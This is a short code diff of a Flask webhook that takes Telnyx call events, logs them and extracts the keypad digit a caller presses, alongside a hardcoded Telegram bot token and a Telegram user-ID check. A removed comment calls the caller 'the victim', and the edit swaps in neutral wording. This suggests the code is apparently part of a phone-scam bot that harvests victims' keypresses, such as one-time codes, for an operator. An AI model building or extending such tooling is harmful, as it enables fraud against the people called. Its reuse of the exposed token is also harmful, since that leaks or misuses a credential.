@@ -8,9 +8,9 @@ TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"
 
 @app.route('/telnyx_webhook', methods=['POST'])
 def telnyx_webhook():
-    # Log the incoming request body
     try:
-        data = request.json  # Capture the incoming JSON data
+        # Log the incoming request body
+        data = request.json
         print(f"Received JSON data: {data}")  # Log the entire JSON data
     except Exception as e:
         print(f"Error while reading JSON data: {str(e)}")
@@ -23,7 +23,7 @@ def telnyx_webhook():
     if not telegram_user_id:
         return 'No Telegram User ID provided', 400
     
-    # Extract the digit pressed by the victim from the incoming data
+    # Log and check for digit in the JSON data
     try:
         digit = data.get('data', {}).get('payload', {}).get('digit', None)
         print(f"Digit Pressed: {digit}")
